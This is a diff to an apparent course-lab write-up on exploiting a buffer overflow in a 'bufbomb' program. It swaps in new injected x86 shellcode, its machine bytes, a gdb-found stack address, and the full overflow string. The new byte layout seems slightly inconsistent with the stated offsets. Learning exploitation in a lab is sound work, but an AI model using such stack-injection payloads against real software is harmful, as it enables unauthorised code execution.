@@ -135,29 +135,28 @@ We need to set <golobal_value> to <cookie> value via assembly code, and finally 
 `bang` locating in `0x08049493`:
 
 ```assembly
-00000000 <.text>:
-   0:	c7 05 98 d1 04 08 21 	movl   $0x20ba0521,0x804d198
-   7:	05 ba 20
-   a:	68 93 94 04 08       	push   $0x8049493
-   f:	c3                   	ret
+mov 0x804d190,%eax
+mov %eax,0x804d198
+push 0x08049493
+ret
 ```
 
 Store the assembly code to <buf> and return to there so that program can execute it.
-Before doing that, we need to find out where it is => use gdb with `x $ebp` => `0x5568fa40`
+Before doing that, we need to find out where it is => use gdb with `x $eax` => `0x5568fa12`
 
 * 0~15: assembly code
 * 16~49: nothing
 * 50~53: buf address
 
 ```
-c7 05 98 d1 04 08 21
-05 ba 20
-68 93 94 04 08
+a1 90 d1 04 08
+a3 98 d1 04 08
+ff 35 93 94 04 08
 c3
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00
-40 fa 68 55
+12 fa 68 55
 ```
